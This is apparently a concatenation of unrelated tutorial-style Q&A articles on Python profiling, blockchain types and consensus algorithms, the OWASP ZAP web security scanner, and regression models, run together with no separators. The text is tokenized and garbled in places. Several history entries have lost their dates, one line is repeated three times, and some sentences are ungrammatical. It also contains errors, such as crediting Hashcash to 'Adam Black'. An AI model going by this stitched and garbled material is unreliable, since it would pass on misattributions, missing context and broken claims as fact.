Commands ` % lprun ` , ` % mprun ` and ` % memit ` are available via modules ` line - profiler ` , ` memory - profiler ` and ` psutil ` .
But to use them within IPython as magic commands , mapping must be done via IPython extension files .
Or use the ` % load_ext ` magic command .
When timing multiple lines of code , use ` % % timeit ` instead of ` % timeit ` .
This is available for ` % prun ` as well .
How to interpret the output of cProfile ?
A sample output from cProfile .
Source : Danjou 2015 .
The output of cProfile can be ordered using the ` -s ` option .
In the accompanying image , we see that the results are ordered by cumulative time in descending order .
Everything starts at the module level from where the ` main ( ) ` function is called .
We can also see that most of this is from ` api.py : request ( ) ` , ` sessions.py : request ( ) ` and ` sessions.py : send ( ) ` .
However , we are unable to tell if these are part of the same call flow or parallel flows .
A graphical viewer would be more useful .
The column " tottime " is the time spent within a function without considering time spent in functions called within .
We also see that the ` readline ( ) ` function from ` socket.py ` is called many times .
It takes 1.571 seconds of 4.481 seconds of cumulative time .
However , the total time within this function is 0 .
This means that we need to optimize functions that are called ` readline ( ) ` .
We suspect it might be the reading operation of the SSL Socket .
The entry " 4/3 " indicates that ` sessions.py : send ( ) ` is called 3 times plus 1 recursive call .
What should I look for when analyzing any profiling output ?
You should identify which function ( or lines of code ) is taking up most of the execution time .
You should identify which function is getting called most often .
Look for call stacks that you did n't expect .
Know the difference between total time spent on function and cumulative time .
The latter enables direct comparison of recursive implementations against iterative ones .
With respect to memory usage , see if there 's a memory leak .
Could you share some tips for optimizing profile code ?
Keep in mind that speeding up a function 100 times is irrelevant if that function takes up only a few percent of the program 's total execution .
This is the essence of profiling .
Optimize only what matters .
If profiling shows that I / O is a bottleneck , threading can help .
If your code uses a lot of regex , try to replace these with string equivalents , which will run faster .
To avoid repeat computations , earlier results can be cached .
This is called memoization .
Where applicable , this can help in improving performance .
If there are no obvious places to optimize the code , you can also consider an alternative runtime such as PyPy or moving critical parts of the code into Cython or C and do the same for Python .
Likewise , vectorize some operations using NumPy .
Consider moving stuff from inner loops .
Remove logging or make it conditional .
If a particular function is called many times , the code could be restructured .
Whether during profiling or after optimizing your code , do n't ignore your unit tests .
They must continue to pass .
Also , keep in mind that optimizing code can compromise on readability and maintainability .
Are there Python IDEs that come with profilers ?
With IPython , Jupyter and Anaconda 's Spyder , ` % time ` and ` % timeit ` can be used by default .
For line profiling or memory profiling , the necessary modules need to be installed before invoking them .
PyCharm Community Edition does not support profiling , but the professional version supports it .
In fact , cProfile , yappi and vmprof are three profilers that are supported .
vmprof is a statistical profiler .
Visual Studio comes with a built - in profiler .
However , this works only for CPython and not for IronPython for which the .NET profiler should be used .
What 's the decorator 's approach to profiling Python code ?
It 's possible to decorate a function for profiling purpose .
We can timestamp the entries and exits and thereby calculate time spent within the function .
The advantage of this approach is that there 's no dependence on any profiling tool .
Overhead can be kept low .
We can choose to profile only specific parts of our program and ignore core modules and third - party modules .
We 'll also have better control of how results will be exported .
What 's Pyflame and why should I want to use it ?
A flame graph from snapshots of Python call stack .
Source : Uber GitHub 2018 .
Pyflame is a profiler for Python that takes snapshots of the Python call stack .
From these , it generates flame graphs .
Pyflame is based on Linux 's ` ptrace ` .
Hence , it ca n't be used on Windows systems .
Pyflame overcomes the limitations of cProfile , which adds overhead and does n't give a full stack trace .
Pyflame also works with code not instrumented for profiling .
Because Pyflame is statistical in nature , meaning that it does n't profile every function call , it can also be used in production .
In CPython implementation , the first code commit is made for the ` profile ` module .
In CPython implementation , the first code commit is made for the ` pstats ` module .
In CPython implementation , the first code commit is made for the ` cProfile ` module .
The initial code commit for ` line_profiler ` was made by Robert Kern .
Version 2.1 of this module was released in December 2017 .
The first version of Pyflame was released by the engineering team at Uber .
Historically , blockchain started as a public permissionless technology when it was used to power Bitcoin .
Since then , other types of blockchains have been created .
These can be categorized as a combination of public / private and permissionless / permissioned .
Each type fits a specific set of use cases .
When choosing a particular type , we have to be aware of the tradeoffs .
In general , public / permissionless - - - - - blockchains are open , decentralized and slow .
Private / permissioned blockchains are closed and centralized , either partially or completely .
They 're also more efficient .
It 's also important to note that for some use cases , traditional databases may suffice instead of a blockchain .
Could you describe the different types of blockchains ?
Comparing the different types of blockchains .
Source : Patientory 2017 .
Broadly , there are two types of blockchains : Permissionless : Anyone can join the network .
They can read / write / verify transactions .
The system is open .
There 's no central authorities .
This system makes sense when no one wants to use a trusted third party ( TTP ) .
Trust is therefore established among peers via an agreed consensus mechanism .
While transactions can be read by anyone , it 's also possible to hide sensitive information if so desired .
Permissioned : A central authority grants permission to only some folks to read / write / verify transactions .
Since writing access is given to a trusted few , consensus is achieved in a simpler and more efficient way .
Public reading access may be allowed .
Some classify blockchains as public , private and permissioned .
In a private blockchain , controlling power is with only one organization .
In a permissioned blockchain , controlling power is given to a few selected entities .
Thus , no single entity can tamper with the system on their own .
These are also called federated or consortium blockchains .
They are a compromise between the openness of public blockchain and the closed control of private blockchains .
How does one go about selecting a suitable blockchain type ?
A flowchart to aid in selecting the right blockchain .
Source : Wagenaarm 2018 .
Blockchain is useful in applications where multiple entities write to a shared database . These entities do n't trust one another and do n't want to use a trusted third party intermediary .
If entities are unknown or wish anonymity , then a permissionless blockchain is desired .
Otherwise , go for a permissioned blockchain .
Blockchain is also useful when multiple copies of a ledger are maintained .
In this case , the blockchain enables real - time reconciliation without having a third - party trusted intermediary .
A public permissioned blockchain is one in which some trusted entities write to the chain but the public is allowed to verify it .
For example , a consumer might want to verify the source of the fish she buys , but only those involved in the supply chain have permission to write to the chain .
In some applications , such as Cryptologic , confidential transaction data is hashed before being added to the public blockchain .
A private permissioned blockchain can be used when control rests with a single trusted entity .
If multiple organizations are involved , then a consortium blockchain is preferred .
What are the advantages of using a permissioned blockchain ?
A permissioned blockchain is similar to a permissionless one except for an additional access control layer .
This layer controls who can participate in the consensus mechanism , and who can create transactions or smart contracts .
A permissioned blockchain gives the following advantages : Performance : Excessive redundant computation of permissionless blockchains is avoided .
Each node will perform only those computations relevant to its application .
Governance : Enables transparent governance within the consortium .
Also , innovation and evolution of the network can be easier and faster than in permissionless - - blockchains .
Cost : It 's cost effective since there 's no need to do spam control such as dealing with infinite loops in smart contracts .
Security : It has the same level of security as permissionaless blockchains : " non - predictive distribution of power over block creation among nodes unlikely to collude .
" In addition , an access control layer is built into the network by design .
Can you name some examples of the different types of blockchains ?
Bitcoin and Ethereum are well - known examples of public blockchains , but Ethereum can also be used to create a private blockchain .
OpenChain enables private blockchains .
China supports permissioned blockchains suited for financial applications .
Patientory is a permissioned blockchain for electronic health records .
Ripple is a permissioned blockchain .
Bitcoin Cash , Zilliqa and Cypherium are permissionless blockchains .
Universa and Oracle Network are permissioned blockchains .
Some platforms can be configured to manage any type of blockchain .
For example , MultiChain and HydraChain can be used for private or permissioned blockchains .
Hyperledger can be used for private or public blockchains .
Hyperledger Fabric and R3 Corda are for private or permissioned blockchains .
William El Kaim has curated a useful list of blockchains , blockchain platforms and applications .
What 's the point of private blockchains where immutability can be compromised ?
It 's true that since a private blockchains is controlled by a single entity or organization , it can be easily tampered with .
It 's therefore argued that private blockchains are no better than shared databases .
If trust and robustness are already guaranteed , one could simply use a database .
Moreover , databases have for long supported code execution ( example , via stored procedures ) that are similar to what the blockchain calls smart contracts .
However , others argue that the use of cryptography and Merkle trees prevent non - valid transactions from getting added to the chain .
With shared databases , hacking on a single entity will corrupt the database for everyone .
This is n't possible with private blockchains when a consensus algorithm such as Juno is used .
Bitcoin was launched using blockchain technology .
It 's the first application of a public blockchain .
Ripple , a permissioned blockchain was launched .
Ethereum , an open permissionless blockchain , is described in a white paper by Vitalik Buterin , a programmer involved with Bitcoin Magazine .
Initial release of Ethereum , an open - source , public , blockchain - based distributed computing platform and operating system featuring smart contract ( scripting ) functionality .
The Linux foundation announces the creation of the Hyperledger Project , a permissioned open - source blockchain .
From 2016 , interest in private / permissioned blockchains increased .
Source : Google Trends 2018 .
This is the year when people start showing greater interest in private plus permissioned blockchains than in public blockchains .
This increased interest continues through 2018 , as shown by Google Trends data collected in March 2018 .
A Blockchain is a distributed peer - to - peer technology .
All nodes in the network have to agree on the state of the chain and what its valid blocks are .
Since there 's no centralized control , and nodes can not be trusted , reaching this agreement is not trivial .
Every blockchain implementation must therefore define what 's called a consensus algorithm to arrive at an agreement .
This is also called consensus protocol .
Consensus is not exclusive to blockchain .
It 's a classical problem in distributed computer systems .
In fact , any algorithm that relies on multiple processes to maintain a common state relies on solving the consensus problem .
What 's the purpose of a blockchain consensus algorithm ?
A permissionless blockchain is open .
Anyone can be a node and remain anonymous .
It 's therefore possible for a node to tamper transactions and include them in a new block .
Thus , the blockchain can end up with what we call a fork .
For example , one fork in the chain contains the tampered transaction while the other contains only valid transactions .
The purpose of a consensus algorithm is to avoid such forks so that everyone agrees to a single version of the truth .
With a permissioned blockchain , although participating nodes are known and chosen , consensus is still required because we ca n't assume that the nodes are trustworthy .
From the general viewpoint of distributed systems , consensus is a challenge when nodes are either faulty ( gone rogue ) or unable to communicate reliably .
The former is called Byzantine Generals Problem and the latter is called Two Army Problem .
A consensus algorithm must therefore be fault tolerant .
How does Bitcoin achieve consensus ?
Bitcoin uses Proof of Work ( PoW ) for consensus .
Before a new block can be added to the chain , a node must perform an expensive computation to arrive at a valid hash value for the block .
All other nodes receiving this block can then quickly verify that this block is indeed a valid one .
A valid block is therefore proof that the node submitting it has done the necessary work .
In fact , all nodes do this work in parallel but whoever is fastest ( has most compute power ) will win the race .
The winning node is rewarded with bitcoins .
For this reason , the work done by nodes is called mining and the nodes themselves are called miners .
We can therefore say that consensus on the Bitcoin network is achieved via mining .
Consensus is achieved by a simple rule that only the longest fork will survive .
In other words , the fork on which most compute power has been expended ( PoW ) will survive .
If two blocks are mined at the same time , there will be a fork .
PoW therefore intentionally slows the mining process so that forks do n't happen faster as they are discarded by the network .
What are some possible attacks on blockchain ?
The idea of any attack is to prevent nodes from reaching consensus or mislead them to a wrong consensus .
Here are a few common attacks : Denial of Service ( DoS ) : Sending nodes lots of transactions will prevent them from working on legitimate ones .
Distributed DoS is a variant of this .
51 % Attack : If the attacker controls more than 50 % of the nodes , then he can influence the consensus process .
He can include modified transactions , cause a fork and make that fork the longest .
Even with less than 50 % controlling power , some attacks can happen with a 50 % success rate .
Double - Spend : Applicable to cryptocurrencies , this is a case when the same coin is used for multiple transactions .
Sybil Attack : This happens when a node assumes multiple identities and tries to pass itself off as multiple nodes in the network .
Cryptographic Attack : Quantum computing will bring computing power 100 million times that of conventional computers .
This shifts the balance in favour of nodes with such power .
Byzantine Attack : A single or few nodes prevent consensus .
Bitcoin - specific attacks are noted in a 2017 survey paper .
What are the different types of blockchain consensus algorithms out there ?
Comparing PoW with PoS. Source : Rosic 2018 .
There are plenty of them and the following are some well - known ones : Proof of Work ( PoW ) : An expensive computation is required and this can be verified by other nodes .
Nodes can remain anonymous and anyone can join .
PoW is synonymous with mining .
Systems that do n't use PoW can be said to be doing virtual mining .
Proof of Stake ( PoS ) : Stakeholders are those who have coins or smart contracts on the blockchain .
Only they can participate .
Those with high stakes are chosen to validate new blocks .
They are rewarded with coins .
While coins are " mined " in PoW , they are " minted " in PoS. Blocks may still need to be signed off by other nodes before being added to the chain .
Delegated Proof of Stake ( DPoS ) : In PoS , those with large stakes can take control .
In DPoS , delegated nodes represent the interests of smaller nodes .
Further examples of consensus algorithms are proof - of - activity , proof - of - burn , proof - of - capacity , Transaction As Proof Of Stake ( TAPOS ) , delegated Byzantine Fault Tolerance ( dBFT ) , Practical Byzantine Fault Tolerance ( PBFT ) , Federated Byzantine Agreement ( FBA ) , and proof - of - weight .
Could you explain Intel 's proposed Proof of Elapsed Time ( PoET ) ?
Proof - of - work wastes electricity to do mining .
Essentially , the idea is to delay the creation of new blocks so that the network has enough time to avoid forking .
Intel 's idea is to mimic PoW by guaranteeing that each node has waited long enough before creating a new block , as if they were " doing work " .
They achieve this by building in their hardware chips a trusted execution environment ( TEE ) that adds to this delay .
It 's claimed that proof - of - elapsed - time can scale to thousands of nodes .
One criticism of this consensus is that nodes have to put their trust in Intel , who is supplying the chips .
This is against the ethos of blockchains that aims to avoid centralization in a trustless environment .
Could you name the consensus algorithms used by some well - known blockchains ?
A chart from KPMG illustrates consensus algorithms used by some well - known blockchains .
Source : Seibold and Samman 2016 , fig .
2 .
Bitcoin uses PoW and so do Ethereum , Litecoin and Dogecoin .
Since PoW is computationally expensive , Ethereum plans to move to PoS sometime in 2018 .
Tendermint , BlackCoin and NXT use PoS. Peercoin and Decred use PoS while Bitshares , Steemit and EOS use DPoS. Hyperledger uses PBFT while Stellar and Ripple use FBA .
MultiChain uses a variant of PBFT where there 's only one validator per block and multiple validators work in a round - robin fashion .
The Chinese platform NEO uses Delegated BFT .
Proof - of - authority is used by POA.Network and Ethereum Kovan testnet .
Proof - of - weight is used by Algorand , Filecoin and Chia .
What are some essential criteria for a blockchain consensus algorithm ?
Important criteria in any distributed ledger technology ( DLT ) .
Source : Wang 2016 .
The most important one is perhaps decentralization .
In this aspect , Bitcoin 's PoW does better than other consensus protocols .
Consensus algorithms have to consider scalability , privacy , security and fault tolerance .
Security implies resistance to attacks .
Node identity management , consensus finality , correctness proofs and assumptions about network synchrony are other parameters to consider .
The algorithm must scale with the number of nodes / clients .
Bitcoin 's PoW can support thousands of nodes / clients but suffers in terms of performance .
BFT can support thousands of clients at better performance but is limited to less than 20 nodes .
Performance relates to throughput ( transactions per second or tps ) and latency .
It must be efficient in terms of power consumption , or in general , consumption of any resource .
Current protocols often involve tradeoffs .
PoS is more energy efficient and achieves higher throughput than PoW , but is more centralized and vulnerable to Byzantine faults .
Prometheus and Matrix are newer algorithms that aim to combine the best of both PoW and PoS. I 've heard of " blockchain killers " .
What are these ?
PARSEC is a blockchain - less open source , fully asynchronous , leaderless algorithm for reaching consensus in the presence of Byzantine faults in an asynchronous network .
Algorithm correctness has been proved provided less than a third of the participating nodes are faulty .
This model matches an agreement with probability of one .
Directed Acyclic Graph ( DAG ) is a graph of nodes with topological ordering and no loops .
DAGs are inspiring the next generation of " blockchains " .
Iota , Hashgraph and Nano are examples of DAG .
Tangle is the DAG consensus algorithm used by Iota .
To generate an Iota transaction , a node has to validate two previous transactions it 's received .
The Nano uses block - lattice as its structure .
Every transaction is made of sending a block on the sender 's chain and receiving a block on the receiver 's chain .
The hashgraph builds a directed graph of events rather the traditional chain of blocks .
Consensus is via gossip : nodes tell neighbours about events , which are ordered by timestamps .
The Hashgraph is claimed to be fair , faster , provable and resistant to Byzantine attacks .
It 's also called Swirlds hashgraph consensus algorithm .
It may not suit open public networks .
Researchers at SRI International in California published a paper titled " The Byzantine Generals Problem " .
The papers start by stating that " reliable computer systems must handle malfunctioning components that give conflicting information to different parts of the system " .
The paper then abstracts this scenario for distributed computer systems .
Researchers at the IBM Almaden Research Center propose the use of pricing functions and hash functions to tackle the problem of spam emails .
The idea is that an email sender must be required to perform a moderately expensive computation and the recipient can verify easily that such a computation has been performed before accepting the email .
This will deter spammers .
The idea of modern proof - of - work can be traced back to this research .
Adam Black invented Hashcash , a PoW system to tackle email spam and denial - of - service attacks .
Hashcash can be credited with making PoW popular .
At the 3rd Symposium on Operating Systems Design and Implementation , researchers from the MIT Laboratory for Computer Science presented " Practical Byzantine Fault Tolerance " as a solution to the Byzantine Generals Problem .
Unlike previous solutions , this works in asynchronous systems and improves response times .
This is further detailed in an ACM paper published in 2002 .
Bitcoin was introduced as a peer - to - peer crytocurrency .
It uses Proof of Work ( PoW ) for consensus .
Since PoW used by Bitcoin is wasteful , Proof of Stake is proposed as a more energy efficient alternative .
This later gave birth to the Peercoin network .
PoS , however , suffers from the " Nothing - at - stake " problem .
Daniel Larimer , founder of BitShares , proposes a new type of PoS in which stakeholders elect nodes who can sign the blocks .
This is the genesis of Delegated Proof of Stake consensus .
Elected nodes are called witnesses and they are trusted to behave correctly .
The voting process is decentralized and fair .
DPoS scales well because nodes need not wait for a minimum number of untrusted nodes to verify a block , which needs to be only signed by one or more trusted nodes .
Intel announces details of the Sawtooth Lake project , a platform for running distributed ledgers .
This talks about two consensus protocols : ( a ) Proof of Elapsed Time ( PoET ) that avoids the energy inefficiency of PoW. ( b ) Quorum Voting that adapts the PBFT protocol and uses it for apps that require immediate transaction finality .
In January 2018 , Hyperledger Sawtooth 1.0 was released and PoET is part of it .
Vlad Zamfir of Ethereum announces that they have been working on a new consensus called Casper .
It 's a PoS type of consensus .
Casper has a mechanism in place to punish nodes that try to exploit the " Nothing - at - stake " situation .
Ethereum is expected to switch from PoW to PoS in 2018 .
MaidSafe announces a new consensus protocol called PARSEC ( Protocol for Asynchronous , Reliable , Secure and Efficient Consensus ) to power its SAFE Network .
PARSEC is a " completely decentralised , open - source , highly asynchronous , Byzantine Fault Tolerant consensus mechanism " .
A sample ZAP UI showing the Spider feature .
Source : Software Informer 2018 .
Software security testing is the process of assessing and testing software to discover security risks and vulnerabilities .
Such testing could be a passive scan to look for vulnerabilities .
Or it could be an active penetration test ( aka pen test ) that simulates malicious users attempting to attack the system .
In complex systems , it 's difficult to manually determine all possible vulnerabilities .
The Zed Attack Proxy ( ZAP ) is an open source tool to automatically find vulnerabilities in web applications .
It 's part of the Open Web Application Security Project ( OWASP ) .
ZAP can be used as a man - in - the - middle between browser and app server .
It can also be used as a standalone application , or as a daemon process without UI .
ZAP is suitable for experienced security professionals as well as web developers and functional testers .
Why should I use ZAP ?
ZAP Overview .
Source : Bennetts 2012 .
ZAP is free and open - source .
ZAP is for experts as well as beginners .
Based on Java , it 's cross - platform and hence it can be used on Windows , MAC or Linux .
It 's also easy to install and use .
It 's fully documented and there are plenty of community resources to help those who are new to ZAP .
It 's internationalized with translated versions in many languages .
We can also use it with other tools that enable CI / CD workflows .
Thus , it 's flexible and extensible .
Could you describe some important ZAP terminology for beginners ?
The following may be a starting point for beginners : Contexts : Typically , a context will correspond to a web application .
It 's a way of grouping together a set of URLs .
Scope : Defined by contexts , it 's the set of URLs to test .
Modes : Each mode allows for certain types of attacks .
This gives flexibility while testing .
Selecting the mode affects the scope .
Alerts : An alert is a potential vulnerability .
It 's associated with a request .
A request can have multiple alerts .
An alert is flagged with a risk level : High , Medium , Low , Informational , False Positive .
Tags : A short text associated with a request .
A request can have multiple tags .
Passive scanning can do automatic tagging based on preset rules .
Notes : You can associate text with a request .
These are for your reference or later action .
Add - ons : Add extra functionality to the ZAP core .
They can be installed from the online Add - on Marketplace .
Examples include Ajax Spider , Diff , Forced Browse , Fuzzer , etc .
Replacer : This is an add - on to replace strings in requests and responses .
What are the modes in which I can use ZAP ?
As of version 2.5.0 , ZAP can be used in one of four modes : Safe , Protected , Standard and ATTACK .
As the names suggest , Safe mode will avoid anything potentially dangerous while ATTACK mode will aggressively try to attack new URLs as soon as they are discovered .
You can configure the ATTACK mode behaviour using Scan Policy .
When pen testing is desired on sites you have permission to test , Protected mode can be used .
The standard mode allows for all types of attacks .
In both Safe mode and Protected mode ( for URLs out of scope ) , ZAP will not perform certain types of attacks .
These include spider crawling , active scanning , fuzzing , force browsing , breaking ( intercepting ) and resending requests .
How can I use ZAP as a proxy ?
ZAP as an intercepting proxy .
Source : OWASP 2017 , pg .
2 .
ZAP can be used as an intercepting proxy .
It stands between the tester 's browser and the web application so that it can intercept and inspect messages sent across , and then forward them to the destination .
In passive scan , message contents are not modified .
In active scan , they are modified to simulate attacks .
To use ZAP as a proxy , you must update the configuration in ZAP as well as the browser you intend to use for the tests .
The Configuring Proxies page on ZAP Wiki gives the details .
Once you have configured ZAP as your browser 's proxy , connect to the web app under test .
ZAP should now start showing one or more entries in the Sites and History tabs .
These are requests and responses that ZAP has intercepted for analysis .
How will ZAP determine what to test in my web application ?
ZAP uses a mix of techniques , some of which may require a test engineer 's help .
One of the simplest is to use the Quick Start add - on .
You enter a URL , typically the home or sitemap URL of the web app .
ZAP will crawl it using its Spider add - on .
This will give ZAP a list of URLs to test .
It will then do an active scan of these .
For a more in - depth test , you should put ZAP in proxy setup .
Then , manually explore your application using your browser .
Alternatively , perform automated regression using Selenium or similar tool .
ZAP will capture all the requests and responses .
It can then use them later to do an attack .
What is a Spider ?
Web spiders and crawlers are commonly used by search engines to discover Internet content .
In the context of ZAP , Spider is an add - on .
It 's used to automatically discover new resources ( URLs ) on a particular site .
It begins with a list of URLs to visit , called seeds , which depends on how the Spider is started .
The Spider then visits these URLs , identifies all the hyperlinks on the page , and adds them to the list of URLs to visit .
This process continues recursively until new resources are not found .
Spiders can discover URLs that are not visible as links on pages .
Sites that are Ajax heavy can not be effective crawled by Spider .
An alternative add - on created by Guifre Ruiz , called Ajax Spider , should be used .
For good coverage , both spiders should be used .
What are Passive Scan and Active Scan ?
Apart from using Spider , there are two different ways in which ZAP looks for vulnerabilities : Passive Scan : ZAP by default passively scans all HTTP messages ( requests and responses ) sent to the web application .
Passive scanning does not change the requests and responses in any way , and is therefore safe to use .
Active Scan : Attempts to find potential vulnerabilities by using known attacks against the selected targets .
You must perform an active scan only if you have permission to test the application .
Fuzzing is a technique that can be used as part of active scanning .
With fuzzing , invalid or unexpected data is submitted to find vulnerabilities .
The rules used for passive and active scans are well documented .
Logical vulnerabilities , such as broken access control , will not be found by any active or automated vulnerability scanning .
Manual penetration testing should always be performed in addition to active scanning to find all types of vulnerabilities .
Can ZAP be used as part of an CI / CD pipeline ?
Jenkins invokes ZAP API as part of its CI / CD pipeline .
Source : DeClario 2016 .
Automated pen testing is possible with ZAP and this is an important part of continuous integration .
It helps to uncover new vulnerabilities as well as regressions of previous vulnerabilities in an environment that is changing quickly , and for which development may be highly collaborative and distributed .
In fact , ZAP is available as a plugin for Jenkins .
ZAP provides a Rest Application Programming Interface ( API ) that allows other tools to interact with ZAP programmatically .
Other tools can make use of this API to trigger attacks .
The ZAP API is available in JSON , HTML and XML formats .
The ZAP API is particularly useful for Security Regression Tests .
Beginners can use a simple web UI to explore and use the API : at ` http://zap/ ` when you 're proxying via ZAP , or via the host / port ZAP is listening on , such as ` http://localhost:8080/ ` .
As part of cloud - based workflows , one example , Microsoft has explained how ZAP can be used in Azure .
For passive scans , it can be part of CI / CD pipelines .
For longer active scans , a nightly pipeline is preferred .
My site runs on HTTPS .
How does ZAP handle SSL certificates ?
The ZAP Root CA certificate replaces the original web app certificate .
Source : Common Sense Education 2018 .
Since ZAP is set up to act as a proxy between your browser and the web application , using SSL ( HTTPS ) will cause the certificate validation to fail and the connection to be terminated .
This is because ZAP encrypts and decrypts traffic sent to the web application using the original web application certificate .
This is done so that ZAP can access the plain text in the requests and responses .
To prevent this failure from happening , ZAP automatically creates an SSL certificate for each host you access , signed by ZAP 's own Certificate Authority ( CA ) certificate .
To have your browser trust these SSL certificates , you need to first import and trust the ZAP Root CA certificate .
Once it is trusted , the other ZAP SSL certificates signed by it will be trusted as well .
A ZAP Root CA certificate is required only for active scans .
For passive scans , since content is not modified , the web app 's original certificate can be used .
Could you share some user stories and case studies of ZAP ?
OWASP ZAP is used by countless organizations across the globe for validating their web application security postures , from government agencies and educational institutions to large enterprises .
Some of these include Mozilla , Microsoft , Ernst & Young , Accenture , and Google .
It 's been commented that the alert levels flagged by ZAP do n't always correspond to reality .
A minor risk may be flagged as high and vice versa .
Reporting is in HTML and this could be improved .
What are the alternatives to using ZAP ?
There are plenty of alternatives to ZAP offering similar or subset of features .
Some of these include Burp Suite , Nikto , Acunetix , w3af , Arachni , Andiparos , HTTP Analyzer , etc .
When comparing alternatives , we need to consider many aspects : features , ease of installation / upgrade , ease of use , learning curve , cost , support ( commercial or community ) , release rate ( how often the tool is updated ) , API and extensibility , available third - party integrations , etc .
UpGuard 's CSTAR Score is one way to quantitatively compare the alternatives , where CSTAR stands for Cybersecurity Threat Assessment Report .
For example , Arachni scores only 399 whereas ZAP scores 788 .
CSTAR Score is also a quick and objective way for business stakeholders to assess security compliance without looking into the details .
For example , an audit of the healthcare sector in 2016 revealed a low CSTAR score of 420 ( danger zone ) .
Based on Java 1.4.2 , Paros Proxy has been released as a tool to test security vulnerabilities in web apps .
Simon Bennetts forks Paros Proxy and experiments with it as a way to learn about security tools .
ZAP took its birth from here .
In December , ZAP 2.0.0 be released .
This release contains contributions from three GSoC ( Google Summer of Code ) Projects that enhance the capability of ZAP .
Meanwhile , Guifre Ruiz created Crawljax ( aka Ajax Spider ) , an open - source Java spider for AJAX web apps .
The Add - on SOAP Scanner has been released .
It comes out of GSoC2014 .
Scanned and detected WSDL files are now read and SOAP petitions now follow the correct format .
Not meant for desktop environments , ZAP as a Service ( ZaaS ) is proposed .
The idea is to run in ' server ' mode : " long - running , highly scalable , distributed service accessed by multiple users with different roles " .
The ZAP Sonar Plugin is available for reporting into SonarQube v6.3 or higher .
The official ZAP Jenkins Plugin has been released .
This extends the functionality of the ZAP security tool into an CI environment .
Introducing the JxBrowser add - on for ZAP .
With ZAP Browser Launch , we can now launch a browser from within ZAP .
In November , ZAP 2.7.0 be released .
Illustrating three types of regression .
Source : Bartocha 2014 .
Regression is widely used for prediction or forecasting , where given one or more independent variables , we try to predict another variable .
For example , given advertising expense , we can predict sales .
Given a mother 's smoking status and the gestation period , we can predict the baby 's birth weight .
There are many types of regression models , one source mentioning as many as 35 different models .
An analyst or statistician must select a model that makes sense to the problem .
Models differ based on the number of independent variables , the type of the dependent variable and how these two are related to each other .
Regression comes from statistics .
It 's one of many techniques used in machine learning .
Could you introduce regression ?
Suppose there 's a dependent or response variable \(Y_i\ ) and independent variables or predictors \(X_i\ ) .
The essence of regression is to estimate the function \(f(X_i,\beta)\ ) that 's a model of how the dependent variable is related to the predictors .
Adding an error term or residual \(\epsilon_i\ ) , we get \(Y_i = f(X_i,\beta ) + \epsilon_i\ ) , for scalar \(Y_i\ ) and vector \(X_i\ ) .
The residual is not seen in the data .
It 's the difference between the observed value \(Y_i\ ) and what the model predicts .
With the goal of minimizing the residuals , regression estimates model parameters or coefficients \(\beta\ ) from data .
There are many ways to do this and the term estimation is used for this process .
Regression modelling also makes important assumptions .
The sampled data should represent the population .
There are no measurement errors in the predictor values .
Residuals have zero mean ( when conditioned on \(X_i\ ) ) and constant variance .
Residuals are also uncorrelated to one another .
More assumptions are used depending on the model type and estimation technique .
Regression uncovers useful relationships , that is , how predictors are correlated to the response variable .
Regression makes no claim that predictors influence or cause the outcome .
Correlations should not be confused with causality .
How do you classify the different types of regression ?
Regression techniques can be classified in many ways : Number of Predictors : We can distinguish between Univariate Regression and Multivariate Regression .
Outcome - Predictors Relationship : When this is linear , we can apply Linear Regression or its many variants .
If the relationship is non - linear , we can apply Polynomial Regression or Spline Regression .
More generally , when the relationship is known it 's Parametric Regression , otherwise it 's Non - parametric Regression .
Predictor Selection : With multiple predictors , sometimes not all of them are important .
Best Subsets Regression or Stepwise Regression can find the right subset of predictors .
We could penalize too many predictors in the model using Ridge Regression , Lasso Regression or Elastic Net Regression .
Correlated Predictors : If predictors are correlated , one approach is to transform them into fewer predictors by a linear combination of the original predictors .
Principal Component Regression ( PCR ) and Partial Least Squares ( PLS ) Regression are two approaches to doing this .
Outcome Type : When predicting categorical data , we can apply Logistic Regression .
When the outcome is a count variable , we can apply Poisson Regression or Negative Binomial Regression .
In fact , a suitable method of regression can be inferred from the distribution of the dependent variable .
What are the types of linear regression models ?
A map of GLM , GLMM and mixed models .
Source : Bolker 2018 .
Simple Regression involves only one predictor .
For example , \(Y_i = \beta_0 + \beta_{1}X_{1i } + \epsilon_i\ ) .
If we generalize to many predictors , the term Multiple Linear Regression is used .
Consider a bivariate linear model \(Y_i = \beta_0 + \beta_{1}X_{1i } + \beta_{2}X^2_{2i } + \epsilon_i\ ) .
Although there 's a square term , the model is still linear in terms of the parameters .
To represent many Multiple Linear Regression models in a compact form , we can use the General Linear Model .
This generalization allows us to work with many dependent variables dependent on the same independent variables .
This also incorporates different statistical models including ANOVA , ANCOVA , OLS , t - test and F - test .
The General Linear Model makes the assumption that \(Y_i ∼ N(X^T_i\beta,\sigma^2)\ ) , that is , response variable is normally distributed with a mean that 's a linear combination of predictors .
A larger class of models is called Generalized Linear Model ( GLM ) that allows \(Y_i\ ) to be any distribution of the exponential family of distributions .
The General Linear Model is a specialization of the GLM .
If response is affected by randomness , the Generalized Linear Mixed Model ( GLMM ) can be used .
Could you compare linear and logistic regression ?
Predicting sex from height .
Source : Brannick 2020 .
Since logistic regression deals with categorical outcomes , it predicts the probability of an outcome rather than a continuous value .
Predictions should therefore be restricted to the range 0 - 1 .
This is done by transforming the linear regression equation to the logit scale .
This is the natural log of the odds of being in one category versus the other categories .
For this reason , logistic regression may be seen as a particular case of GLM .
Logit is used as the link function that relates predictors to the outcome .
Logistic regression shares with linear regression many of the assumptions : independence of errors , linearity ( but in the logit scale ) , absence of multicollinearity among predictors , and lack of influential outliers .
There are three types of logistic regressions : Binary : Only two outcomes .
Example : predicting that a student will pass a test .
When all predictors are categorial , we call them logit models .
Nominal : More than two outcomes .
also called Multinominal Logistic Regression .
Example : predicting the colour of an iPhone model a customer is likely to buy .
Ordinal : More than two ordered outcomes .
Example : predicting a medical condition ( good , stable , serious , critical ) .
Could you explain parametric versus non - parametric regression ?
Examples of non - parametric models .
Source : Ghahramani 2015 , slide 2 .
Linear models and even non - linear models are parametric models since we know ( or make an educated guess ) about how the outcome relates to predictors .
Once the model is fixed , the task is to estimate the parameters \(\beta\ ) of the model .
If we have problems with this estimation , we can revise the model and try again .
Non - parametric regression is more suitable when we have no idea how the outcome relates to the predictors .
Usually , when the relationship is non - linear , we can adopt non - parametric regression .
For example , one study attempting to predict the logarithm of wage from age found that non - parametric regression approaches outperformed simple linear and polynomial regression methods .
Parametric models have a finite set of parameters that try to capture everything about observed data .
Model complexity is bounded even with unbounded data .
Non - parametric models are more flexible because the model gets better as more data is observed .
We can view them as having infinite parameters or functions that we attempt to estimate .
